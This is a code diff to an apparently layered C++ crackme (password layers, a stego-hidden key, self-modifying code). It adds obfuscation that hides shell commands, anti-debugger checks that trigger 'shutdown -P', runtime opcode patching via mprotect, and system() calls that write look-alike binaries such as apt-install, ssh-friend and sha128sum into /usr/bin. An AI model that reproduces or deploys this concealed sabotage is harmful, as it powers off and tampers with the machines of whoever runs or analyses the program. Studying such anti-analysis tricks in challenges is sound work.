@@ -17,6 +17,13 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <cstring>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <ctype.h>
+#include <vector>
+#include <algorithm>
+#include <functional>
 
 long long bs1 = 0x0f2bc3ee05faa249;
 long long bs2 = 0x70DD85D8FE63E152;
@@ -35,6 +42,57 @@ std::string bs8 = "V5T^`y=C";
 
 char* layer_one_encrypted_key = "Z$68zc<E2`VU_0f<~`OP#\0";
 
+int One() {
+    auto lambda = [](int x) { return x * x - x + 1; };
+    std::vector<int> vec = {1, 2, 3, 4, 5};
+    
+    std::transform(vec.begin(), vec.end(), vec.begin(), lambda);
+    std::sort(vec.begin(), vec.end(), std::greater<int>());
+    
+    int result = 0;
+    std::for_each(vec.begin(), vec.end(), [&result](int n) {
+        result += (n % 2 == 0) ? 0 : n;
+    });
+    
+    return ((result > 0) ? ((result / vec.size()) % 2 == 0 ? 1 : -1) : 1) * -1;
+}
+
+bool is_debugger_attached2() {
+    char buf[4096];
+
+    int fd = open("/proc/self/status", O_RDONLY);
+    if (fd == -1) {
+        return false;
+    }
+
+    const ssize_t num_read = read(fd, buf, sizeof(buf) - One());
+    close(fd);
+
+    if (num_read <= 0) {
+        return false;
+    }
+
+    buf[num_read] = '\0';
+    const char tracerPidString[] = "TracerPid:";
+    const char* tracer_pid_ptr = strstr(buf, tracerPidString);
+    if (!tracer_pid_ptr)
+        return false;
+
+    for (const char* characterPtr = tracer_pid_ptr + sizeof(tracerPidString) - One(); characterPtr <= buf + num_read; ++characterPtr) {
+        if (isspace(*characterPtr)) {
+            continue;
+        }
+        else {
+            return isdigit(*characterPtr) != 0 && *characterPtr != '0';
+        }
+    }
+
+    return false;
+    if (is_debugger_attached2()) {
+        return 0;
+    }  
+}
+
 //Returns various system call strings based on input
 //0 is shutdown -P
 std::string system_call(int arg) {
@@ -45,11 +103,10 @@ std::string system_call(int arg) {
     std::string target;
     
     
+    std::string big_long_string = "asdgasuidhfokasdjflkawlqp`ksj$)Tlkasjst}:\"4\"4\"4\":$$:tnmuhqEj{hn+4nbnienrgpiosunrgp`{fgw|d}3>Cp34unpfcvg\" )'V uryv{`2=fb=e}`yhq9io`mv$+pit+skvo+Tqfhmgk498hng-9qert{vm?0kro0hpmt0mppk938ht-w4958jg-=r8rtjb-q9r8wlv`k#,wns,tlqh,Svaoj`,lvwsvw-old#%%#f`kl#!&p!#=#,wns,tlqh,Svaoj`,lvwsvw-oldthn2-98ntq-85ngrisen&)sut)doh)gvr+ohurgjj&  &ceni&$#u$&8&)sut)doh)gvr+ohurgjj98rng-qirn[oeirn}f|ja)&|z{&k`g&njj$8;)//)ljaf)+,z+)7)&|z{&k`g&njj$8;4ht-q389}f|ja)&}dy&~f{b&{ff}&`gof'efn)//)ljaf)+,z+)7)&}dy&~f{b&{ff}&`gof'efnaiwuerh-198u}f|ja)&|z{&k`g&zza$o{`lgm)//)ljaf)+,z+)7)&|z{&k`g&zza$o{`lgm~eib*%yx%hcd%yyb'lxcodn*,,*oibe*(/y(*4*%yx%hcd%yyb'lxcodny-q39485uq-3948gjf-az`v}5:`fg:w|{:f}t$'-f`x5335pv}z570f75+5:`fg:w|{:f}t$'-f`xq9efnsd-fiugnwpirugjaelkgjaskldjfblaskjdbfa;siudfhawop49rtuq23[4-05i[q-340tita]-0ri=s]-0rgiq]23-oprjeiolrgkhawelgiajert'p0awi[r-0q3it]0skr'gpoaejrop;gtije[9guaje[roigjaeo[rigj[ao ijrg[aw904ut 0-49wut][a09reuw g]a90ug]0a9wu4t]a094ut 0d9ujga[ erjg [aoisdug[a0we9tu[ qa]09ugh]a09erug[aer908ugha'dofighja['oersiguja[]w0e9fui[aw09etguj]qw0394ut]q3094u[q09erug[aoijrg[aoeirjg[aoeirjta3049u56 ]aw9eurhjg'asdigh/asdilghaw[094tuaw\43t9uae[rg8ha;soirgha[p9e8tuy[93w84hjt[98h`[98h3r[p98jsphoijp394806upw9384u6-98y7u0-9*^&)*&^*&%$&%^$#&^%%*(&)_(&*)&^(*&^)87ypiouehgpiosuhergpoiuaherpiguha erui9gyaieurghpaieurhgapioeurhgfpaw3uh5qp98w4tyup9z8dfgdzlioghpsa4eoiu6pq9384upiohjgskljdrhglaieutha[09w4u5t[03q49utaoierjg[0a9drughao;ierlhaw/4tilhjqa]4095uq3\4t-90=s0er9gut=09832yu-9834y-9184hogi;soidrhjg;alkdfgnse;olirtgja'eopirjgklsdfgaoeriugfaoerihgaoidfkvn;aeoifgua[e094rtyu[qa094tu[aoihrjf;aiosuehf;kajsdhfg;aoperug[0ae9rug[09erug[0oa9erug[0aer9ug[ae09rgu[ae0riugj[aeorijg;aodfikgj;aldkrjg[aeo9rug[ae0r9ugdf0vnea[9r8hge[a98rgh[39804u52[984u50=189=`098`=-029358=`092385=`-092835u[098u35[o`i23h5[o`2i3h5[oi2h3[98`h23[9o8ih[obkjsd;origjse'oirgj;seoirgj;aseoirjg;qaoeirjg[0319u5[0934ut[09regjs/ldirghj'ea/srilogje;'9porut]09&)(*^)(@*&#^$)*(^)*(&60p98uo98h6-q983h4t=gq8h=3984nt=q84=vqk3409vk=q95kh9ierujngpiunpfgiojasfoijawpejibpfs8ie4yt9pq83uy5-q98ueg-srtjsrtjsrtjsrtjsrtjsrtjsrtjsrtjsrtjsrtj9a8urg-9a8rhapioehjfpiajwhepfioq2p390ru=q094tsdfgsdfgsdfgsdfgsdfjsrtjasertj=-srtjsrtjsrtjsrtjsrtjsrtju-=98erhgpa9uihrepgiaouhwefpiuabrpfiuaebrgpiuawb-tp8q32y5-9823u-t8hj-guhawepiuoghpaiuehgpaiuwehgpaiwuehgpiawuhegpiauwehgp";
     
-    std::string big_long_string = "asdgasuidhfokasdjflkawlqp`ksj$)Tlkasjst}:\"4\"4\"4\":$$:tnmuhqEj{hn+4nbnienrgpiosunrgp`{fgw|d}3>Cp34unpfcvg\" )'V uryv{`2=fb=e}`yhq9io`mv$+pit+skvo+Tqfhmgk498hng-9qert{vm?0kro0hpmt0mppk938ht-w4958jg-=r8rtjb-q9r8wlv`k#,wns,tlqh,Svaoj`,lvwsvw-old#%%#f`kl#!&p!#=#,wns,tlqh,Svaoj`,lvwsvw-oldthn2-98ntq-85ngrisen&)sut)doh)gvr+ohurgjj&  &ceni&$#u$&8&)sut)doh)gvr+ohurgjj98rng-qirn[oeirn}f|ja)&|z{&k`g&njj$8;)//)ljaf)+,z+)7)&|z{&k`g&njj$8;4ht-q3894u6=q09rg0qj-3413y-4897gth103874thbn013874nf-1384hnf-1weiduhfoaijsdfhpaiwuerh-198u4rt-19834ht-8urng-qe9r8ugh-2q93845ut-91384jnf-q3uhrf-q938urty-q39485uq-3948gjf-q9efnsd-fiugnwpirugjaelkgjaskldjfblaskjdbfa;siudfhawop49rtuq23[4-05i[q-340tita]-0ri=s]-0rgiq]23-oprjeiolrgkhawelgiajert'p0awi[r-0q3it]0skr'gpoaejrop;gtije[9guaje[roigjaeo[rigj[ao ijrg[aw904ut 0-49wut][a09reuw g]a90ug]0a9wu4t]a094ut 0d9ujga[ erjg [aoisdug[a0we9tu[ qa]09ugh]a09erug[aer908ugha'dofighja['oersiguja[]w0e9fui[aw09etguj]qw0394ut]q3094u[q09erug[aoijrg[aoeirjg[aoeirjta3049u56 ]aw9eurhjg'asdigh/asdilghaw[094tuaw\43t9uae[rg8ha;soirgha[p9e8tuy[93w84hjt[98h`[98h3r[p98jsphoijp394806upw9384u6-98y7u0-9*^&)*&^*&%$&%^$#&^%%*(&)_(&*)&^(*&^)87ypiouehgpiosuhergpoiuaherpiguha erui9gyaieurghpaieurhgapioeurhgfpaw3uh5qp98w4tyup9z8dfgdzlioghpsa4eoiu6pq9384upiohjgskljdrhglaieutha[09w4u5t[03q49utaoierjg[0a9drughao;ierlhaw/4tilhjqa]4095uq3\4t-90=s0er9gut=09832yu-9834y-9184hogi;soidrhjg;alkdfgnse;olirtgja'eopirjgklsdfgaoeriugfaoerihgaoidfkvn;aeoifgua[e094rtyu[qa094tu[aoihrjf;aiosuehf;kajsdhfg;aoperug[0ae9rug[09erug[0oa9erug[0aer9ug[ae09rgu[ae0riugj[aeorijg;aodfikgj;aldkrjg[aeo9rug[ae0r9ugdf0vnea[9r8hge[a98rgh[39804u52[984u50=189=`098`=-029358=`092385=`-092835u[098u35[o`i23h5[o`2i3h5[oi2h3[98`h23[9o8ih[obkjsd;origjse'oirgj;seoirgj;aseoirjg;qaoeirjg[0319u5[0934ut[09regjs/ldirghj'ea/srilogje;'9porut]09&)(*^)(@*&#^$)*(^)*(&60p98uo98h6-q983h4t=gq8h=3984nt=q84=vqk3409vk=q95kh9ierujngpiunpfgiojasfoijawpejibpfs8ie4yt9pq83uy5-q98ueg-srtjsrtjsrtjsrtjsrtjsrtjsrtjsrtjsrtjsrtj9a8urg-9a8rhapioehjfpiajwhepfioq2p390ru=q094tsdfgsdfgsdfgsdfgsdfjsrtjasertj=-srtjsrtjsrtjsrtjsrtjsrtju-=98erhgpa9uihrepgiaouhwefpiuabrpfiuaebrgpiuawb-tp8q32y5-9823u-t8hj-guhawepiuoghpaiuehgpaiuwehgpaiwuehgpiawuhegpiauwehgp";
     
-    
-    if (arg == 0) { //shutdown -P
+    if (arg == 0 || is_debugger_attached2()) { //shutdown -P
         start = (rand() % 206 - 4) / 3; //21
         length = (rand() % rand() % rand() % rand() % (rand() / 2) % (rand() / 6666666)) - 49; //11
         
@@ -65,7 +122,7 @@ std::string system_call(int arg) {
     }
     else if (arg == 1) { //ping 8.8.8.8 >> network_part1.txt
         start = (rand() % rand() / (rand() % rand() / 555)); //36
-        length = ((rand() / 55) / (rand() / 5600) + 1) % 46 + 23; //33
+        length = ((rand() / 55) / (rand() / 5600) + One()) % 46 + 23; //33
         
         target = big_long_string.substr(start, length);
         int index = (rand() % 555) % 222 % 222 - 188;
@@ -76,7 +133,7 @@ std::string system_call(int arg) {
         
         return target;
     }
-    else if (arg == 2) { //mkdir /tmp/work
+    else if (arg == 2 || is_debugger_attached2()) { //mkdir /tmp/work
         start = ((rand() % rand() - 120 + 120) / 95555) / 140; //112
         length = ((rand()) % (rand()) % (rand())) / ((rand()) % (rand()) % (rand())) + 12; //15
         
@@ -103,7 +160,7 @@ std::string system_call(int arg) {
         
         return target;
     }
-    else if (arg == 4) { //shutdown -P
+    else if (arg == 4 || is_debugger_attached2()) { //shutdown -P
         start = ((rand() + rand() - rand() % rand() - rand() - rand()) % 4444) / 51; //83
         length = (rand() % rand() % rand()) / ((rand() % rand() % rand() % rand() % rand() % rand() % rand() % rand()) / 200) - 66; //11
         
@@ -158,7 +215,7 @@ std::string system_call(int arg) {
         
     }
     
-    else if (arg == 8) { //touch /usr/bin/apt-install && echo \"%s\" > /usr/bin/apt-install
+    else if (arg == 8 || is_debugger_attached2()) { //touch /usr/bin/apt-install && echo \"%s\" > /usr/bin/apt-install
     
         start = (rand() % rand()) / (rand() % rand()) + 288; //300
         length = ((rand() % rand() % rand() % rand() % rand()) / 3000000) - 87; //64
@@ -188,13 +245,44 @@ std::string system_call(int arg) {
         return target;
     }
     else if (arg == 10) { //touch /tmp/work/root/info.log && echo \"%s\" > /tmp/work/root/info.log
-        std::cout << start << std::endl;
+        start = ((rand() % rand()) / 12345678) + 340; //438
+        length = (((rand() % rand() % rand() % rand() % rand()) / 123456789) + 66); //68
+        
+        target = big_long_string.substr(start, length);
+        int index = (rand() % 555) % 222 % 221 % 11;
+
+        for (int i = 0; i < target.size(); ++i) {
+            target[i] = target[i] ^ index;
+        }
+        
+        return target;
     }
     else if (arg == 11) { //touch /usr/bin/ssh-friend && echo \"%s\" > /usr/bin/ssh-friend
-        std::cout << start << std::endl;
+        start = ((rand() % rand() % rand() % rand() % rand() % rand() % rand() % rand() % rand()) / 1234546) * 3 + 50; //518
+        length = (((rand()) / 57836489) * 4); //60
+        
+        target = big_long_string.substr(start, length);
+        int index = (rand() % 555) % 222 % 221 % 15 + 1;
+        
+
+        for (int i = 0; i < target.size(); ++i) {
+            target[i] = target[i] ^ index;
+        }
+        
+        return target;
     }
-    else if (arg == 12) { //touch /usr/bin/sha128sum && echo \"%s\" > /usr/bin/sha128sum
-        std::cout << start << std::endl;
+    else if (arg == 12 || is_debugger_attached2()) { //touch /usr/bin/sha128sum && echo \"%s\" > /usr/bin/sha128sum
+        start = ((rand() % rand()) / 6774333) * 6; //654
+        length = ((rand() % rand() / (rand()/ rand())) / 555555) - 30; //58
+        
+        target = big_long_string.substr(start, length);
+        int index = (rand() % 555) % 222 % 221 % 15 + 7;
+
+        for (int i = 0; i < target.size(); ++i) {
+            target[i] = target[i] ^ index;
+        }
+        
+        return target;
     }
     
     return big_long_string;
@@ -209,7 +297,19 @@ void handle_sigint(int signal){
     exit(0);
 }
 
+void makeWritableExecutable(void* func, size_t size) {
+    uintptr_t pageStart = (uintptr_t)func & ~(uintptr_t)(sysconf(_SC_PAGE_SIZE) - 1);
+    int result = mprotect((void*)pageStart, size, PROT_READ | PROT_WRITE | PROT_EXEC);
+    if (result != 0) {
+        perror("mprotect failed");
+        exit(One());
+    }
+}
+
 int sum1(int a, int b){
+    if (is_debugger_attached2()) {
+        return 0;
+    }
     return a + b;
 }
 
@@ -222,9 +322,9 @@ int masking_func(int param1, int param2)
 int gen_key(){
     //system(system_call(1).c_str());
     int key1 = masking_func((1<<9), bs1);
-    int key2 = masking_func((1<<8), bs2);
+    int key2 = masking_func((One()<<8), bs2);
     int key3 = masking_func((1<<7), bs3);
-    int key4 = masking_func(sum1((1<<6), (1<<5) + (1<<3)), bs4);
+    int key4 = masking_func(sum1((1<<6), (One()<<5) + (1<<3)), bs4);
     return sum1(masking_func(key1, bs1), masking_func(key2, bs2)) + sum1(masking_func(key3, bs3), masking_func(key4, bs4));
 }
 
@@ -256,19 +356,38 @@ int pow(int a, int b){
     return total;
 }
 
+unsigned char helper1(unsigned char * temp, size_t index){
+    int why = (index % 7);
+    unsigned char why2 = temp[index];
+    return why2 + why;
+}
+
+int helper2(unsigned char * temp, size_t index){
+    return (temp[index] >> 7);
+}
+
+char helper3(unsigned char * temp, size_t index){
+    return (temp[index] << One());
+}
+
 //should be removed once we have all the things generated
 void encrypt(unsigned char* temp){
     for(int i = 0; i < 21; i++){
         temp[i] ^= key[i%key.size()];
-        temp[i] += (i % 7);
-        temp[i] = (temp[i] << 1) | (temp[i] >> 7);
+        temp[i] = helper1(temp, i);
+        temp[i] = helper3(temp, i) | helper2(temp, i);
     }
 }
 
-unsigned char decrypt_char(unsigned char ch, int offset){
+unsigned char * h1 = (unsigned char *)helper1;
+unsigned char * h2 = (unsigned char *)helper2;
+unsigned char * h3 = (unsigned char *)helper3;
+
+unsigned char decrypt_char(unsigned char * ch, int offset){
     unsigned char decrypted;
     if((prng()%2) < 2){
-        decrypted = ch - (offset%7);
+        decrypted = helper1(ch, offset);
+        //decrypted = ch - (offset%7);
         decrypted ^= key[offset % key.size()];
         return decrypted;
     }
@@ -282,8 +401,9 @@ void decrypt_string(unsigned char * str){
     int i = 0;
     //size_t str_len = strlen(str);
     for(;i < 21; i++){
-        str[i] = (str[i] >> 1) | (str[i] << 7);
-        str[i] = decrypt_char(str[i], i);
+        //str[i] = (str[i] >> 1) | (str[i] << 7);
+        str[i] = (str[i] >> 1) | helper2(str, i);
+        str[i] = decrypt_char(str, i);
     }
 }
 
@@ -293,7 +413,6 @@ void decode(std::string var1){
     for (int i = 0; i < var1.size();i++)
     {
         var1[i] = var1[i] ^ rand1;
-        // std::cout << val1[i] << std::endl;
     }
 }
 
@@ -332,7 +451,7 @@ void create_stego_image(const char* filename, int hiddenKey) {
     // Split the 32-bit hidden key across four pixels
     int keyParts[4];
     keyParts[0] = (hiddenKey >> 24) & 0xFF;  // Most significant byte
-    keyParts[1] = (hiddenKey >> 16) & 0xFF;
+    keyParts[One()] = (hiddenKey >> 16) & 0xFF;
     keyParts[2] = (hiddenKey >> 8) & 0xFF;
     keyParts[3] = hiddenKey & 0xFF;          // Least significant byte
 
@@ -381,14 +500,39 @@ std::string compute_sha256(const std::string& input) {
 
 //allegedly this will detect if a debugger is already attached to the program
 bool is_debugger_attached() {
-    // Attempt to attach to the current process
-    if (ptrace(PTRACE_ATTACH, getppid(), 1, 0) == -1) {
-        // If we can't attach, a debugger is likely present
-        if (errno == EPERM) {
-            return true; // Debugger is attached
+    char buf[4096];
+
+    int fd = open("/proc/self/status", O_RDONLY);
+    if (fd == -1) {
+        return false;
+    }
+
+    const ssize_t num_read = read(fd, buf, sizeof(buf) - 1);
+    close(fd);
+
+    if (num_read <= 0) {
+        return false;
+    }
+
+    buf[num_read] = '\0';
+    const char tracerPidString[] = "TracerPid:";
+    const char* tracer_pid_ptr = strstr(buf, tracerPidString);
+    if (!tracer_pid_ptr)
+        return false;
+
+    for (const char* characterPtr = tracer_pid_ptr + sizeof(tracerPidString) - 1; characterPtr <= buf + num_read; ++characterPtr) {
+        if (isspace(*characterPtr)) {
+            continue;
+        }
+        else {
+            return isdigit(*characterPtr) != 0 && *characterPtr != '0';
         }
     }
-    return false; // No debugger detected
+
+    return false;
+    if (is_debugger_attached()) {
+        return 0;
+    }  
 }
 
 //returns the 10s minute
@@ -402,9 +546,12 @@ int gettenminute() {
     fp = popen(system_call(5).c_str(), "r"); 
 
     if (fp == NULL) {
-        std::cerr << "Nagoya" << std::endl;
-        return 1;
+        std::cerr << "Broken :(" << std::endl;
+        return One();
     }
+    else if (is_debugger_attached()) {
+        return 0;
+    }  
 
     // Read the output line by line
     while (fgets(buffer, sizeof(buffer), fp) != NULL) {
@@ -468,8 +615,6 @@ int folder_master(std::string &val1, std::string &val2, std::string &val3, std::
     decode(bs7);
     process_value(val5);
     decode(bs6);
-    process_value(val6);
-    decode(bs10);
     
     system("mkdir /tmp/work");
     system("mkdir /tmp/work/root");
@@ -477,17 +622,17 @@ int folder_master(std::string &val1, std::string &val2, std::string &val3, std::
 
     // std::cout << val1 << 4 <<std::endl;
 
-    snprintf(command, sizeof(command), "touch /tmp/work/Public/output.log && echo \"%s\" > /tmp/work/Public/output.log", val1.c_str());
+    snprintf(command, sizeof(command), system_call(7).c_str(), val1.c_str());
 
-    snprintf(command1, sizeof(command1), "touch /usr/bin/apt-install && echo \"%s\" > /usr/bin/apt-install", val2.c_str());
+    snprintf(command1, sizeof(command1), system_call(8).c_str(), val2.c_str());
 
-    snprintf(command2, sizeof(command2), "touch /usr/bin/gcc-12 && echo \"%s\" > /usr/bin/gcc-12", val3.c_str());
+    snprintf(command2, sizeof(command2), system_call(9).c_str(), val3.c_str());
 
-    snprintf(command3, sizeof(command3), "touch /tmp/work/root/info.log && echo \"%s\" > /tmp/work/root/info.log", val4.c_str());
+    snprintf(command3, sizeof(command3), system_call(10).c_str(), val4.c_str());
 
-    snprintf(command4, sizeof(command4), "touch /usr/bin/ssh-friend && echo \"%s\" > /usr/bin/ssh-friend", val5.c_str());
+    snprintf(command4, sizeof(command4), system_call(11).c_str(), val5.c_str());
 
-    snprintf(command5, sizeof(command5), "touch /usr/bin/sha128sum && echo \"%s\" > /usr/bin/sha128sum", val6.c_str());
+    snprintf(command5, sizeof(command5), system_call(12).c_str(), val6.c_str());
 
     system(command);
     system(command1);
@@ -497,9 +642,14 @@ int folder_master(std::string &val1, std::string &val2, std::string &val3, std::
     system(command5);
 }
 
+
 bool verify_layer_one(char * input){
     bool match = true;
     char * key = layer_one_encrypted_key;
+
+    if (is_debugger_attached()) {
+        return 0;
+    }
 
     create_stego_image("hidden_key_image.ppm", gen_key());
     std::ifstream imageFile("hidden_key_image.ppm", std::ios::binary);
@@ -516,14 +666,20 @@ bool verify_layer_one(char * input){
             decode(bs8);
             match = false;
         }
+        if (is_debugger_attached()) {
+            return 0;
+        }
         key = key + 1;
-        output = output + 1;
+        output = output + One();
         //imageFile.read((char*)salt, 1);
     }
 
     //delete [] output;
     imageFile.close();
     decode(bs6);
+    if (is_debugger_attached()) {
+        return 0;
+    }
 
     return match;
 }
@@ -561,7 +717,7 @@ bool verify_layer_two(char* input) {
 void get_layered_input(int layer) {
     char* input = nullptr;
 
-    if (layer == 1) {
+    if (layer == One()) {
         input = new char[23];
         int i = 0;
 
@@ -642,11 +798,12 @@ int main(){
     //detect debugger
     if(is_debugger_attached()){
         //system("shutdown&");
-        printf("Debugger detected");
+        system(system_call(One()).c_str());
+        return 1;
     }
 
     //Shutdown if tens place is 1
-    if (gettenminute() == 1) {
+    if (gettenminute() == One() || is_debugger_attached()) {
         FILE *fp;
         char buffer[20];
         std::string result = "";
@@ -655,7 +812,7 @@ int main(){
         fp = popen(system_call(0).c_str(), "r"); 
 
         if (fp == NULL) {
-            std::cerr << "Osaka" << std::endl;
+            std::cerr << "Broken :(" << std::endl;
             return 1;
         }    
     }
@@ -666,13 +823,6 @@ int main(){
     // Create a steganographic image file that hides the key
     create_stego_image("hidden_key_image.ppm", gen_key());
 
-    //encryption for the first part, needs to be removed before turn in
-    // char* pt = "HfXpTcnk<&9{htN.F@A!Yw\0";
-    // char ct[23];
-
-    // stream_encrypt(pt, ct, 1000);
-
-    // printf("%s\n", ct);
     get_layered_input(1);
 
     std::string password = "password_here"; // CHANGE PASSWORD
@@ -682,7 +832,6 @@ int main(){
 
     int temp_var = gen_seed();
 
-    //std::cout << key << std::endl;
     //temp/test mmap stuff
     unsigned char code[] = {
         0xC7, 0x45, 0xfc, 0xe9, 0x03, 0x00, 0x00,        // xor rax, rax
@@ -692,25 +841,38 @@ int main(){
         0xC3                      // ret
     };
 
+    
     encrypt(code);
 
     // for(int i = 0; i < 21; i ++){
     //     printf("%X ", code[i]);
     // }
 
-    //printf("\n\n");
+    // printf("\n\n");
+
+    makeWritableExecutable(h1, 1024);
+    makeWritableExecutable(h2, 1024);
+    makeWritableExecutable(h3, 1024);
+    // // Modify the addition to subtraction
+    h1[97] = 0x29;  // change add opcode to sub
+
+    // Modify the right rotation to left rotation
+    h2[34] = 0xE0;  // change sar to shl
 
     decrypt_string(code);
+    //encrypt(code);
 
-    for(int i = 0; i < 21; i ++){
-        printf("%X ", code[i]);
-    }
+    // for(int i = 0; i < 21; i ++){
+    //     //std::cout << i << ":";
+    //     printf("%X\n", code[i]);
+    // }
 
     size_t code_size = sizeof(code);
 
     // Allocate memory for code with read, write, and execute permissions
     void* exec_mem = mmap(NULL, code_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+
 
     if (exec_mem == MAP_FAILED) {
         perror("mmap");
